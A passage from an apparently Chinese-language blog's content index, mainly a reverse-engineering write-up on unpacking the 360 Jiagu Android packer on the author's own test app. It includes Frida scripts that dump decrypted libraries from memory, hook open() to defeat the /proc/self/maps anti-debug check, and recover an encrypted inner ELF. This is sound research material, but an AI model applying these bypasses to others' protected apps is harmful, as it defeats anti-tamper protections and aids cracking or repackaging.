元组中条目的 from_param() 类方法，该方法允许将实际参数适配为此外部函数所接受的对象。 例如， argtypes 元组中的 c_char_p 条目将使用 ctypes 转换规则把作为参数传入的字符串转换为字节串对象。 所以说 obj 本身是 py_object , 但是由于这个机制的存在，被强制转换为了 c_void_p , 我们不妨打印各个参数的地址来印证一下 这里我们通过 cast 将 py_object 强制转换为了 c_void_p , 可以发现第一个参数的地址和返回值的地址是一模一样的 在调用 cast 将目标数据转换成目标类型前，python 又分配了一块新的内存来存储经过 cast 转换之后的 data, 然而分配了内存之后却没有即时的释放这块内存，造成内存泄漏也不足为奇了 所以我们现在要做的就是释放掉这一块内存，而这可以使用 ctypes.memset 实现，将这块内存全部都置为 0, 不就相当于把这块内存 free 掉了嘛 再起一个无限循环，通过任务管理器观察 python 进程的内存占用，终于… 不再内存泄漏了","categories":[],"tags":[]},{"title":"360加固dex解密流程分析","slug":"360-jiagu","date":"2024-02-21T19:14:53.000Z","updated":"2025-04-08T18:55:11.178Z","comments":true,"path":"360-jiagu/","link":"","permalink":"https://oacia.dev/360-jiagu/","excerpt":"","text":"# 前言 在去年 9 月的时候，我就想研究一下 apk 的加固，在网上逛了一圈，感觉 360 加固不错，所以先选它啦，写了一个测试 apk 丢到 360 加固里面加固了一下 这里我用的是 360 加固的免费版 (因为付费版太贵啦) 本来计划着去年分析完 360 加固的，但是总是抽不出一段完整的时间来所以就拖到了现在，终于最近因为过年赋闲在家，就花了几天分析了一下 360 加固，感觉这几天探索 360 加固的过程真是充满了惊喜和乐趣呢～ 2024 年 3 月 8 号记: 距离上次看 360 加固已经半个月啦，今天正想着自己要做什么事情的时候，到博客看了眼 TODOlist, 突然发现咦我是不是还没看过 dex 的解密算法长什么样？所以今天就把这个给做完了，不得不说逆向真的是消磨无聊时间最有效的方法哈哈哈 360 加固测试 apk: 下载地址 未加固的原版 apk: 下载地址 # java 层初步分析 包名: com.oacia.apk_protect 入口: com.stub.StubApp 我们从 AndroidManifest.xml 中可以得知，360 加固的入口是 com.stub.StubApp , 所以我们就先进到 apk 的入口进行分析 在这个入口类中，不仅有常规的 onCreate() 函数，还有一个函数值得注意，他就是 attachBaseContext(Context context) Application 的 onCreate 和 attachBaseContext 是 Application 的两个回调方法，通常我们会在其中做一些初始化操作， attachBaseContext 在 onCreate 之前执行 其中出现的字符串经过了加密混淆操作，加密函数如下，算法是将所有的字符与 16 进行异或 我们写个 jeb 脚本把加密字符串解密来方便后续的静态分析 # coding=utf-8from com.pnfsoftware.jeb.client.api import IScript, IconType, ButtonGroupTypefrom com.pnfsoftware.jeb.core import RuntimeProjectUtilfrom com.pnfsoftware.jeb.core.units.code.java import IJavaSourceUnitfrom com.pnfsoftware.jeb.core.units.code import ICodeUnit, ICodeItemfrom com.pnfsoftware.jeb.core.output.text import ITextDocumentfrom com.pnfsoftware.jeb.core.units.code.java import IJavaSourceUnit, IJavaStaticField, IJavaNewArray, IJavaConstant, IJavaCall, IJavaField, IJavaMethod, IJavaClassfrom com.pnfsoftware.jeb.core.events import JebEvent, Jfrom com.pnfsoftware.jeb.core.util import DecompilerHelper# 解密字符串函数的类名以及方法名methodName = ['Lcom/qihoo/util/a;', 'a']class dec_str_360jiagu(IScript): def run(self, ctx): print('start deal with strings') self.ctx = ctx engctx = ctx.getEnginesContext() if not engctx: print('Back-end engines not initialized') return projects = engctx.getProjects() if not projects: print('There is no opened project') return units = RuntimeProjectUtil.findUnitsByType(projects[0], IJavaSourceUnit, False) for unit in units: javaClass = unit.getClassElement() print('[+] decrypt:' + javaClass.getName()) self.cstbuilder = unit.getFactories().getConstantFactory() self.processClass(javaClass) unit.notifyListeners(JebEvent(J.UnitChange)) print('Done.') def processClass(self, javaClass): if javaClass.getName() == methodName[0]: return for method in javaClass.getMethods(): block = method.getBody() i = 0 while i &lt; block.size(): stm = block.get(i) self.checkElement(block, stm) i += 1 def checkElement(self, parent, e): try: if isinstance(e, IJavaCall): mmethod = e.getMethod() mname = mmethod.getName() msig = mmethod.getSignature() if mname == methodName[1] and methodName[0] in msig: v = [] for arg in e.getArguments(): if isinstance(arg, IJavaConstant): v.append(arg.getString()) if len(v) == 1: decstr = self.decryptstring(v[0]) parent.replaceSubElement(e, self.cstbuilder.createString(decstr)) for subelt in e.getSubElements(): if isinstance(subelt, IJavaClass) or isinstance(subelt, IJavaField) or isinstance(subelt, IJavaMethod): continue self.checkElement(e, subelt) except: print('error') def decryptstring(self, string): src = [] for index, char in enumerate(string): src.append(chr(ord(char) ^ 16)) return ''.join(src).decode('unicode_escape')解密后的效果如下 我们往下进行分析，可以知道 attachBaseContext 的第一个作用是根据目标手机的架构加载 libjiagu_xxx.so 如图 这些 so 在 assets 目录下 在加载完 libjiagu_xxx.so 之后，还调用了 DtcLoader 类进行初始化，这里使用的 jadx 的反编译结果，因为 jeb 没有反编译出 DtcLoader.init(); 方法来 DtcLoader 类如图所示 当 DtcLoader 类被加载到 JVM 中时，会去加载 libjgdtc.so , 如果加载失败，则会尝试从 /data/app/com.oacia.apk_protect/lib/arm64/libjgdtc.so 或者 /data/data/com.oacia.apk_protect/lib/libjgdtc.so 中去加载这个 so 但是当我们去进入到这两个目录进行寻找时，却发现没有这个 libjgdtc.so 存在 所以我们的分析重点是在 libjiagu.so 中，这里我选取了 arm64 架构的 so 文件 libjiagu_a64.so 进行分析 # 壳 ELF 导入导出表修复 我们使用 ida 分析 libjiagu_a64.so , 发现导入表和导出表都没有内容，既然是这种情况，那么应该是在 so 装载进内存时导入导出表才会去进行相应的链接操作 所以我们可以先用 frida 把这个 so 给 dump 下来 首先我们在手机上运行一下 frida server PS D:\\frida> adb shellblueline:/ $ sublueline:/ # cd /data/local/tmpblueline:/data/local/tmp # ./fs -l 0.0.0.0:1234随后做一下端口转发 adb forward tcp:1234 tcp:1234frida 命令行语句如下 frida -H 127.0.0.1:1234 -l .\\hook.js -f \"com.oacia.apk_protect\"注入如下脚本 function my_hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; dump_so(\"libjiagu_64.so\"); &#125; &#125; &#125; );&#125;function dump_so(so_name) &#123; var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); var file_path = \"/data/data/com.oacia.apk_protect/\" + libso.name + \"_\" + libso.base + \"_\" + ptr(libso.size) + \".so\"; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; Memory.protect(ptr(libso.base), libso.size, 'rwx'); var libso_buffer = ptr(libso.base).readByteArray(libso.size); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125;&#125;setImmediate(my_hook_dlopen(\"libjiagu_64.so\")); 随后我们使用 SoFixer 修复一下这个 so, 这里的 -m 参数即这个 so 在内存中的 base 基地址 .\\SoFixer-Windows-64.exe -s .\\libjiagu_64.so_0x74a2845000_0x274000.so -o .\\libjiagu_64_0x74a2845000_0x274000_fix.so -m 0x74a2845000 -d修复完成后，导入表和导出表就恢复了 # 加固壳反调试初步分析 首先我们去 hook 一下打开 so 的函数 function hook_dlopen() &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); console.log(\"load \" + path); &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen)日志如下，所以反调试是在 libjiagu_64.so 中 load libstats_jni.soload /data/app/~~P6meiEqXSQZrP2ChUgVgOg==/com.oacia.apk_protect-ezyVSLdtBZmLTZejgPlSoQ==/oat/arm64/base.odexload /data/data/com.oacia.apk_protect/.jiagu/libjiagu_64.so然后去 hook 打开文件的函数 open function my_hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; hook_open(); &#125; &#125; &#125; );&#125;function hook_open()&#123; var pth = Module.findExportByName(null,\"open\"); Interceptor.attach(ptr(pth),&#123; onEnter:function(args)&#123; this.filename = args[0]; console.log(\"\",this.filename.readCString()) &#125;,onLeave:function(retval)&#123; &#125; &#125;)&#125;setImmediate(my_hook_dlopen,\"libjiagu\");日志如下 这里我们发现了 /proc/self/maps , 这是常见的反调试，要绕过这个检测，我们可以备份一个正常的 maps 文件，然后用 frida 去 hook open 函数，如果匹配到字符串 maps , 就将字符串重定向到我们备份的 maps 文件 首先我们正常打开一次加壳的 apk, 然后使用下列命令备份 maps cp /proc/self/maps /data/data/com.oacia.apk_protect/maps然后我们注入如下 frida 脚本 function my_hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; hook_proc_self_maps(); &#125; &#125; &#125; );&#125;function hook_proc_self_maps() &#123; const openPtr = Module.getExportByName(null, 'open'); const open = new NativeFunction(openPtr, 'int', ['pointer', 'int']); var fakePath = \"/data/data/com.oacia.apk_protect/maps\"; Interceptor.replace(openPtr, new NativeCallback(function (pathnameptr, flag) &#123; var pathname = Memory.readUtf8String(pathnameptr); console.log(\"open\",pathname); if (pathname.indexOf(\"maps\") >= 0) &#123; console.log(\"find\",pathname,\",redirect to\",fakePath); var filename = Memory.allocUtf8String(fakePath); return open(filename, flag); &#125; var fd = open(pathnameptr, flag); return fd; &#125;, 'int', ['pointer', 'int']));&#125;setImmediate(my_hook_dlopen,\"libjiagu\");但是当注入这段脚本后，进程由于非法内存访问而退出了，这说明 360 加固不仅读取 maps 文件，并且会尝试访问 maps 文件中所记录的文件或内存映射。这里由于 frida 注入后重启 apk, 但是备份的 maps 文件中记录的是先前的映射起始地址 (这块内存在关闭 apk 后就被抹去了), 所以当壳尝试访问其中的映射时产生了非法内存访问从而让进程崩溃 这里我的解决方式是将上述 frida 代码中的 fakePath 赋值为一个不存在的文件例如 /data/data/com.oacia.apk_protect/maps_nonexistent , 来让壳没有内容可以访问 修改完 fakePath 后重新注入代码，这个打印出来的日志可以说非常有意思，我们来看一下，相比 hook open 之前的日志，我们成功的让 360 加固的壳释放出了 dex 然而这个壳似乎是又发现了些什么异常，随后赶紧让 app 退出了，但是由于退出的太过仓促，它甚至还没有来得及把 dex 从文件夹中删除 用 010editor 打开 classes.dex , 发现前几位并不是 dex 的魔术头，说明这个 dex 还没有被解密，不过现在我们只需要分析 dex 如何被壳从内存中释放出来的过程就可以了～ 如何可以定位到是什么位置调用了 open 函数来打开 classes.dex 呢？ 很简单，打印一下堆栈就可以了 假如我们使用常规的 frida 打印堆栈代码，即使用 DebugSymbol.fromAddress 函数来判断地址所在的 so 的位置，那么进程是会报错退出的 console.log('RegisterNatives called from:\\\\n' + Thread.backtrace(this.context, Backtracer.FUZZY).map(DebugSymbol.fromAddress).join('\\\\n') + '\\\\n');所以这里 DebugSymbol.fromAddress 所实现的逻辑需要自己编写，即下方的 addr_in_so 函数 function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"is in\",process_Obj_Module_Arr[i].name,\"offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125;&#125;function hook_proc_self_maps() &#123; const openPtr = Module.getExportByName(null, 'open'); const open = new NativeFunction(openPtr, 'int', ['pointer', 'int']); var fakePath = \"/data/data/com.oacia.apk_protect/maps_nonexistent\"; Interceptor.replace(openPtr, new NativeCallback(function (pathnameptr, flag) &#123; var pathname = Memory.readUtf8String(pathnameptr); console.log(\"open\",pathname);//,Process.getCurrentThreadId() if (pathname.indexOf(\"maps\") >= 0) &#123; console.log(\"find\",pathname+\", redirect to\",fakePath); var filename = Memory.allocUtf8String(fakePath); return open(filename, flag); &#125; if (pathname.indexOf(\"dex\") >= 0) &#123; Thread.backtrace(this.context, Backtracer.FUZZY).map(addr_in_so); &#125; var fd = open(pathnameptr, flag); return fd; &#125;, 'int', ['pointer', 'int']));&#125;function my_hook_dlopen(soName='') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); //console.log(path); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; hook_proc_self_maps(); &#125; &#125; &#125; );&#125;setImmediate(my_hook_dlopen,'libjiagu');于是我们得到了释放三个 dex 文件的堆栈回溯 classes.dex classes2.dex classes3.dex 这里我们发现 classes.dex 与 classes2.dex 的堆栈回溯完全相同，并且 classes3.dex 的前半部分和前两个 dex 的堆栈一样，随后进程便又退出了 通过对堆栈的分析，我们可以发现三个 dex 应该是在一个循环中被依次加载的 接下来我们便跳转到堆栈所打印的偏移来进一步分析下 然而当我们跳转到堆栈回溯中的 libjiagu_64.so 的偏移 0x19b780 或者 0x134598 时，却发现这些地址的值都是 0 我们很快就能想到这里用到的技术应该是先将一块内存标记为可写可执行，随后将字节码填充进去，所以说，我们只需要在壳打开 dex 时，将此时的 libjiagu_64.so 从内存中 dump 下来就可以了 function dump_so(so_name) &#123; var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); var file_path = \"/data/data/com.oacia.apk_protect/\" + libso.name + \"_\" + libso.base + \"_\" + ptr(libso.size) + \".so\"; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; Memory.protect(ptr(libso.base), libso.size, 'rwx'); var libso_buffer = ptr(libso.base).readByteArray(libso.size); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125;&#125;var dump_once = false;// 因为会打开三次 dex, 所以这里我们仅 dump 打开第一次 dex 时的 libjiagu_64.sofunction hook_proc_self_maps() &#123; const openPtr = Module.getExportByName(null, 'open'); const open = new NativeFunction(openPtr, 'int', ['pointer', 'int']); var fakePath = \"/data/data/com.oacia.apk_protect/maps_nonexistent\"; Interceptor.replace(openPtr, new NativeCallback(function (pathnameptr, flag) &#123; var pathname = Memory.readUtf8String(pathnameptr); console.log(\"open\",pathname);//,Process.getCurrentThreadId() if (pathname.indexOf(\"maps\") >= 0) &#123; console.log(\"find\",pathname+\", redirect to\",fakePath); var filename = Memory.allocUtf8String(fakePath); return open(filename, flag); &#125; if (pathname.indexOf(\"dex\") >= 0) &#123; if(!dump_once)&#123; dump_once = true; dump_so(\"libjiagu_64.so\"); &#125; &#125; var fd = open(pathnameptr, flag); return fd; &#125;, 'int', ['pointer', 'int']));&#125;然后再去用 SoFixer 修复这个 dump 下来的 so .\\SoFixer-Windows-64.exe -s .\\libjiagu_64.so_0x7a69829000_0x274000_open_classes.dex.so -o .\\libjiagu_64.so_0x7a69829000_0x274000_open_classes.dex_fix.so -m 0x7a69829000 -d再次来到偏移 0x19B780 处，可以发现这块空内存已经被填充了数据 接下来我们想知道的是究竟是从什么地方开始被填充了新的数据，所以我们可以用 WinMerge 来让填充和未填充数据的 so 进行比较看看，结果却有了惊人的发现，被填充的数据是从 0xe7000 开始的，它的开头竟然是 ELF 文件的魔数头！？这有意思了，那么就是一个 so 里面藏了另外一个 so 咯～ 我们写个 python 脚本，把这个 ELF 从 0x0e7000 开始后面的所有字节都复制到新的文件里面 with open('libjiagu_64.so_0x7a69829000_0x274000_open_classes.dex.so','rb') as f: s=f.read()with open('libjiagu_0xe7000.so','wb') as f: f.write(s[0xe7000::])但是当把这个 elf 提取出来之后拿 010editor 看却发现 program header table 被加密了 这就导致 ida 根本就无法进行正常的分析 # 主 ELF 解密流程分析 壳 elf 加载主 elf, 并且 program header 还被加密了，感觉这种形式很像是 自实现 linker 加固 so 对于这种加固方式，壳 elf 在代码中自己实现了解析 ELF 文件的函数，并将解析结果赋值到 soinfo 结构体中，随后调用 dlopen 进行手动加载 来到 ida 里面在导入表对 dlopen 进行交叉引用，我们看到 dlopen 有 5 个交叉引用 看到第二个交叉引用，来到 sub_3C94 函数，这个 for 循环看起来像是在用符号表通过 dlopen 加载依赖项 向上面翻翻代码，看到这个 switch 就知道找对地方了，这里应该就是自实现 linker 来加载 so 的 因为这和 AOSP 源码 ( android-platform\\bionic\\linker\\linker.cpp ) 中的预链接 ( soinfo::prelink_image ) 这部分的操作极为的相似 那接下来就在 ida 中导入 soinfo 相关的符号就可以啦 在 ida 中依次点击 View-&gt;Open subviews-&gt;Local Types , 然后按下键盘上的 Insert 将下面的结构体添加到对话框中 //IMPORTANT//ELF64 启用该宏#define __LP64__ 1//ELF32 启用该宏//#define __work_around_b_24465209__ 1/*//https://android.googlesource.com/platform/bionic/+/master/linker/Android.bp架构为 32 位 定义__work_around_b_24465209__宏arch: &#123; arm: &#123;cflags: [\"-D__work_around_b_24465209__\"],&#125;, x86: &#123;cflags: [\"-D__work_around_b_24465209__\"],&#125;, &#125;*///android-platform\\bionic\\libc\\include\\link.h#if defined(__LP64__)#define ElfW(type) Elf64_ ## type#else#define ElfW(type) Elf32_ ## type#endif//android-platform\\bionic\\linker\\linker_common_types.h// Android uses RELA for LP64.#if defined(__LP64__)#define USE_RELA 1#endif//android-platform\\bionic\\libc\\kernel\\uapi\\asm-generic\\int-ll64.h//__signed__-->signedtypedef signed char __s8;typedef unsigned char __u8;typedef signed short __s16;typedef unsigned short __u16;typedef signed int __s32;typedef unsigned int __u32;typedef signed long long __s64;typedef unsigned long long __u64;//A12-src\\msm-google\\include\\uapi\\linux\\elf.h/* 32-bit ELF base types. */typedef __u32 Elf32_Addr;typedef __u16 Elf32_Half;typedef __u32 Elf32_Off;typedef __s32 Elf32_Sword;typedef __u32 Elf32_Word;/* 64-bit ELF base types. */typedef __u64 Elf64_Addr;typedef __u16 Elf64_Half;typedef __s16 Elf64_SHalf;typedef __u64 Elf64_Off;typedef __s32 Elf64_Sword;typedef __u32 Elf64_Word;typedef __u64 Elf64_Xword;typedef __s64 Elf64_Sxword;typedef struct dynamic&#123; Elf32_Sword d_tag; union&#123; Elf32_Sword d_val; Elf32_Addr d_ptr; &#125; d_un;&#125; Elf32_Dyn;typedef struct &#123; Elf64_Sxword d_tag; /* entry tag value */ union &#123; Elf64_Xword d_val; Elf64_Addr d_ptr; &#125; d_un;&#125; Elf64_Dyn;typedef struct elf32_rel &#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125; Elf32_Rel;typedef struct elf64_rel &#123; Elf64_Addr r_offset; /* Location at which to apply the action */ Elf64_Xword r_info; /* index and type of relocation */&#125; Elf64_Rel;typedef struct elf32_rela&#123; Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend;&#125; Elf32_Rela;typedef struct elf64_rela &#123; Elf64_Addr r_offset; /* Location at which to apply the action */ Elf64_Xword r_info; /* index and type of relocation */ Elf64_Sxword r_addend; /* Constant addend used to compute value */&#125; Elf64_Rela;typedef struct elf32_sym&#123; Elf32_Word st_name; Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; unsigned char st_other; Elf32_Half st_shndx;&#125; Elf32_Sym;typedef struct elf64_sym &#123; Elf64_Word st_name; /* Symbol name, index in string tbl */ unsigned char st_info; /* Type and binding attributes */ unsigned char st_other; /* No defined meaning, 0 */ Elf64_Half st_shndx; /* Associated section index */ Elf64_Addr st_value; /* Value of the symbol */ Elf64_Xword st_size; /* Associated symbol size */&#125; Elf64_Sym;#define EI_NIDENT 16typedef struct elf32_hdr&#123; unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; /* Entry point */ Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125; Elf32_Ehdr;typedef struct elf64_hdr &#123; unsigned char e_ident[EI_NIDENT]; /* ELF \"magic number\" */ Elf64_Half e_type; Elf64_Half e_machine; Elf64_Word e_version; Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; Elf64_Half e_ehsize; Elf64_Half e_phentsize; Elf64_Half e_phnum; Elf64_Half e_shentsize; Elf64_Half e_shnum; Elf64_Half e_shstrndx;&#125; Elf64_Ehdr;/* These constants define the permissions on sections in the program header, p_flags. */#define PF_R 0x4#define PF_W 0x2#define PF_X 0x1typedef struct elf32_phdr&#123; Elf32_Word p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; Elf32_Word p_filesz; Elf32_Word p_memsz; Elf32_Word p_flags; Elf32_Word p_align;&#125; Elf32_Phdr;typedef struct elf64_phdr &#123; Elf64_Word p_type; Elf64_Word p_flags; Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment, file &amp; memory */&#125; Elf64_Phdr;typedef struct elf32_shdr &#123; Elf32_Word sh_name; Elf32_Word sh_type; Elf32_Word sh_flags; Elf32_Addr sh_addr; Elf32_Off sh_offset; Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign; Elf32_Word sh_entsize;&#125; Elf32_Shdr;typedef struct elf64_shdr &#123; Elf64_Word sh_name; /* Section name, index in string tbl */ Elf64_Word sh_type; /* Type of section */ Elf64_Xword sh_flags; /* Miscellaneous section attributes */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Size of section in bytes */ Elf64_Word sh_link; /* Index of another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */&#125; Elf64_Shdr;//android-platform\\bionic\\linker\\linker_soinfo.htypedef void (*linker_dtor_function_t)();typedef void (*linker_ctor_function_t)(int, char**, char**);#if defined(__work_around_b_24465209__)#define SOINFO_NAME_LEN 128#endifstruct soinfo &#123;#if defined(__work_around_b_24465209__) char old_name_[SOINFO_NAME_LEN];#endif const ElfW(Phdr)* phdr; size_t phnum;#if defined(__work_around_b_24465209__) ElfW(Addr) unused0; // DO NOT USE, maintained for compatibility.#endif ElfW(Addr) base; size_t size;#if defined(__work_around_b_24465209__) uint32_t unused1; // DO NOT USE, maintained for compatibility.#endif ElfW(Dyn)* dynamic;#if defined(__work_around_b_24465209__) uint32_t unused2; // DO NOT USE, maintained for compatibility uint32_t unused3; // DO NOT USE, maintained for compatibility#endif soinfo* next; uint32_t flags_; const char* strtab_; ElfW(Sym)* symtab_; size_t nbucket_; size_t nchain_; uint32_t* bucket_; uint32_t* chain_;#if !defined(__LP64__) ElfW(Addr)** unused4; // DO NOT USE, maintained for compatibility#endif#if defined(USE_RELA) ElfW(Rela)* plt_rela_; size_t plt_rela_count_; ElfW(Rela)* rela_; size_t rela_count_;#else ElfW(Rel)* plt_rel_; size_t plt_rel_count_; ElfW(Rel)* rel_; size_t rel_count_;#endif linker_ctor_function_t* preinit_array_; size_t preinit_array_count_; linker_ctor_function_t* init_array_; size_t init_array_count_; linker_dtor_function_t* fini_array_; size_t fini_array_count_; linker_ctor_function_t init_func_; linker_dtor_function_t fini_func_;/*#if defined (__arm__) // ARM EABI section used for stack unwinding. uint32_t* ARM_exidx; size_t ARM_exidx_count;#endif size_t ref_count_;// 怎么找不 link_map 这个类型的声明... link_map link_map_head; bool constructors_called; // When you read a virtual address from the ELF file, add this //value to get the corresponding address in the process' address space. ElfW (Addr) load_bias;#if !defined (__LP64__) bool has_text_relocations;#endif bool has_DT_SYMBOLIC;*/&#125;;导入完成后按下 Y 键，将 a1 定义为 soinfo* 然后就可以看到这些符号了，但是看这些符号总感觉有些不太对劲，这里不应该出现 a1[1] 或者 a1[2] , 所以我猜测这个 soinfo 有被魔改的痕迹 虽然这个 soinfo 可能有被魔改了，我们还是从 sub_3C94 这个预链接相关函数入手好了，交叉引用发现 sub_3C94 是被 sub_49F0 调用 随后我们来到 sub_49F0 内调用 sub_3C94 函数的位置，向下看，进入 sub_4918 函数中 sub_4918 中调用了 sub_5E6C , 我们进入 sub_5E6C 这个函数中出现了 0x38 这个数字， 0x38 是这个循环的步长 0x38 这个数字有什么特殊的含义吗？当然有了！！ 我们把刚刚提取出来的 elf 用 010editor 打开，看到 elf_header 的 phentsize 这个字段，这个字段的含义是一个 Program header table 的长度，它正正好好也是 0x38 所以说在 sub_5E6C 中变量 v5 的类型应该是 Elf64_Phdr * , 我们直接重定义类型 既然知道了真正的 program header table 就是在这个位置的，那我们直接在这个地方把 program header table 整个给 dump 下来不就行了 所以我们直接去 hook sub_5E6C 的三个传入的值 function hook_5E6C()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x5E6C), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(hexdump(args[0], &#123; offset: 0,// 相对偏移 length: 0x38*0x6+0x20,//dump 的大小 header: true, ansi: true &#125;)); console.log(args[1]) console.log(args[2]) console.log(`base = $&#123;module.base&#125;`) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125; 上面的第一个 hexdump 就是 program header table , 我们可以用 cyberchef 将 hexdump 转成数组的形式 0x6 则对应着 phnum , 这表示共有 6 个 program header table 0x793ca38000 表示这个主 ELF 的基址，因为这个主 ELF 的位置在壳 ELF 基址的偏移 0xe7000 处，而最下面这行也已经打印出了壳 ELF 的基址为 0x793c951000 , 0x793ca38000==0x793c951000+0xe7000 等式成立 至此为止，我们拿到了解密之后的 program header table , 同时我们也知道了 sub_5E6C 传入的三个参数分别是 phdr , phnum 以及 base 但是 phdr 成员命名是在 soinfo 偏移的 0x0 的位置 那假如 a1 的类型就是 soinfo* , 为什么在 sub_4918 里面调用 sub_5E6C 传入的是偏移是 232 呢？ 所以 soinfo* 必定有被魔改，同时我们也可以在 soinfo 前填充一个大小为 232 的 char 类型数组看看是什么情况 很好，这验证了我们对于 soinfo* 被魔改的猜测，因为在一切正常的情况之下，函数的调用应该是 sub_5E6C(a1-&gt;phdr, a1-&gt;phnum, a1-&gt;base) 才对 但是我很想知道这个壳 ELF 究竟是如何被解密出来的，那么首先来看看主 ELF 的函数调用链是什么样子的吧～ 我写了一个 ida 插件来实现这个过程 stalker_trace_so 在 IDA 中使用 Edit-&gt;Plugins-&gt;stalker_trace_so 后，在 so 所在的目录下会生成一个 js 脚本，我们用 frida 注入到 apk 中即可，需要注意的是 so_name 需要改成 libjiagu_64.so 打印出来的完整日志如下 call1:JNI_OnLoadcall2:j_interpreter_wrap_int64_tcall3:interpreter_wrap_int64_t call4:getenvcall5:sub_13908call6:inotify_add_watchcall7:sub_11220call8:fopencall9:sub_9DD8call10:sub_E3E0call11:strtolcall12:feofcall13:raisecall14:memsetcall15:sub_C918call16:sub_9988call17:sub_9964call18:sub_9AC4call19:j_ffi_prep_cifcall20:ffi_prep_cifcall21:j_ffi_prep_cif_machdepcall22:ffi_prep_cif_machdepcall23:j_ffi_callcall24:ffi_callcall25:sub_1674Ccall26:j_ffi_call_SYSVcall27:ffi_call_SYSVcall28:sub_167BCcall29:sub_1647Ccall30:sub_163DCcall31:sub_9900call32:sub_94BCcall33:inotify_initcall34:fmodcall35:strncpycall36:_Z9__arm_a_1P7_JavaVMP7_JNIEnvPvRicall37:sub_9E58call38:sub_999Ccall39:sub_10964call40:j_lseek_1call41:lseekcall42:sub_96E0call43:sub_8000call44:dlopencall45:sub_60E0call46:sub_6544call47:sub_4B54call48:sub_6128call49:_ZN9__arm_c_19__arm_c_0Evcall50:sub_A3ECcall51:sub_99CCcall52:sub_9944call53:sub_6484call54:sub_6590call55:prctlcall56:sub_6698call57:sub_9FFCcall58:j_lseek_3call59:j_lseek_2call60:j_lseek_0call61:sub_9A90call62:sub_5F20call63:sub_6044call64:sub_3574call65:uncompresscall66:sub_49F0call67:sub_5400call68:sub_5478call69:sub_5B08call70:sub_5650call71:sub_580Ccall72:opencall73:atoicall74:sub_3C94call75:strncmpcall76:sub_4918call77:sub_4000call78:sub_41B4call79:sub_35ACcall80:sigactioncall81:sub_5E6Ccall82:sub_5444call83:sub_633Ccall84:sub_8130call85:sub_4C70call86:sub_825Ccall87:sub_8B50call88:sub_8ED4call89:sub_8430call90:interpreter_w